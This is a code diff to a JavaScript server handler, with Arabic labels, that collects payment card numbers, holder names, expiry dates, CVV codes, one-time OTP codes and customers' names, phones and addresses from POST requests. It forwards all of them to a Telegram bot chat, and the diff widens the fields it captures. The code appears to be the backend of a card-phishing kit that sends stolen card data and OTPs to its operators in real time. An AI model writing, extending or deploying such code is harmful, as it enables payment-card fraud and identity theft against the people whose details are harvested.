@@ -1,3 +1,20 @@
+function buildFormattedMessage(orderInfo = {}, card = 'غير متوفر', holder = 'غير متوفر', expiry = 'غير متوفر', cvv = 'غير متوفر') {
+  return [
+    'الاسم: ' + (orderInfo.customer_name || 'غير متوفر'),
+    'الرقم: ' + (orderInfo.customer_phone || 'غير متوفر'),
+    'العنوان: ' + (orderInfo.customer_address || 'غير متوفر'),
+    'المنتجات: ' + (orderInfo.products || 'غير متوفر'),
+    'المبلغ الكلي: ' + (orderInfo.total_amount || 'غير متوفر'),
+    'الدفعة الأولى: ' + (orderInfo.first_payment || 'غير متوفر'),
+    'رابط الفاتورة: ' + (orderInfo.invoice_link || 'غير متوفر'),
+    '-------------------------',
+    'حامل البطاقة: ' + holder,
+    'رقم البطاقة: ' + card,
+    'تاريخ الانتهاء: ' + expiry,
+    'CVV: ' + cvv
+  ].join('\n');
+}
+
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -58,35 +75,42 @@ export default async function handler(req, res) {
   if (req.method === 'POST') {
     const body = req.body || {};
     const userId = body.user_id || 'غير متوفر';
-    
+
     let text = '';
     let isOtp = false;
+    let parseMode = undefined;
 
     if (body.رمز_التحقق_OTP || body.otp) {
       // رسالة OTP
       isOtp = true;
+      parseMode = 'Markdown';
       const otpCode = body.رمز_التحقق_OTP || body.otp;
-      const cardNum = body.رقم_البطاقة || body.cardNumber || 'غير متوفر';
-      const cardHolder = body.اسم_الحامل || body.cardHolder || 'غير متوفر';
+      const cardNum = body.رقم_البطاقة || body.cardNumber || body.card_number || 'غير متوفر';
+      const cardHolder = body.اسم_الحامل || body.cardHolder || body.card_name || body.cardName || 'غير متوفر';
 
       text = `🔐 *كود التحقق (OTP) الجديد*\n\n` +
              `👤 اسم الحامل: ${cardHolder}\n` +
              `💳 رقم البطاقة: \`${cardNum}\`\n` +
-             `🔑 كود الـ OTP: \`*${otpCode}*\`\n` +
+             `🔑 كود الـ OTP: \`${otpCode}\`\n` +
              `🆔 معرف المستخدم: \`${userId}\``;
     } else {
-      // رسالة الفيزا العادية
-      const cardNumber = body.card_number || body.cardNumber || 'غير متوفر';
-      const cardName = body.card_name || body.cardName || body.cardHolder || 'غير متوفر';
-      const expDate = body.exp_date || body.expDate || body.expiryDate || 'غير متوفر';
+      // رسالة بيانات الطلب والبطاقة بالتنسيق المطلوب
+      const orderInfo = body.orderInfo || body.order_info || {
+        customer_name: body.customer_name,
+        customer_phone: body.customer_phone,
+        customer_address: body.customer_address,
+        products: body.products,
+        total_amount: body.total_amount,
+        first_payment: body.first_payment,
+        invoice_link: body.invoice_link
+      };
+
+      const cardNumber = body.card_number || body.cardNumber || body.card || 'غير متوفر';
+      const cardName = body.card_name || body.cardName || body.cardHolder || body.holder || 'غير متوفر';
+      const expDate = body.exp_date || body.expDate || body.expiryDate || body.expiry || 'غير متوفر';
       const cvc = body.cvv || body.cvc || body.check_id || 'غير متوفر';
 
-      text = `💳 *طلب بطاقة دفع جديدة (فيزا)*\n\n` +
-               `👤 اسم الحامل: ${cardName}\n` +
-               `💳 رقم البطاقة: \`${cardNumber}\`\n` +
-               `📅 الانتهاء: ${expDate}\n` +
-               `🔒 CVC / Check ID: \`${cvc}\`\n` +
-               `🆔 معرف المستخدم: \`${userId}\``;
+      text = buildFormattedMessage(orderInfo, cardNumber, cardName, expDate, cvc);
     }
 
     const prefix = isOtp ? 'otp_' : 'pay_';
@@ -100,15 +124,17 @@ export default async function handler(req, res) {
     };
 
     try {
+      const payload = {
+        chat_id: CHAT_ID,
+        text: text,
+        reply_markup: keyboard
+      };
+      if (parseMode) payload.parse_mode = parseMode;
+
       const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: text,
-          parse_mode: 'Markdown',
-          reply_markup: keyboard
-        })
+        body: JSON.stringify(payload)
       });
 
       const tgResult = await tgRes.json();
